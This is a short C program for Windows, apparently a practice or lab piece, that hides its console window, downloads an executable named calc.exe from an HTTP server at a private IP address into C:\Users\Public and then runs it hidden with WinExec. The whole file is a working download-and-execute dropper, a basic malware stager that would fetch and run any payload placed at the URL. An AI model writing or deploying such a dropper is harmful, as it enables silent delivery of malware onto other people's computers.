#include <Windows.h>
#include <stdio.h>
#include <urlmon.h>
#pragma comment (lib, "urlmon.lib")

/* TO DO
download file
execute file
*/

int wmain() {
	FreeConsole();
	LPCWSTR szURL = L"http://192.168.243.132:8000/calc.exe";
	LPCWSTR szFileName = L"C:\\Users\\Public\\calc.exe";
	HRESULT asdf;
	asdf = URLDownloadToFileW(NULL, szURL, szFileName, 0, NULL);

	UINT fdsa;
	LPCSTR szExecFile = "C:\\Users\\Public\\calc.exe";
	fdsa = WinExec(szExecFile, 0);
}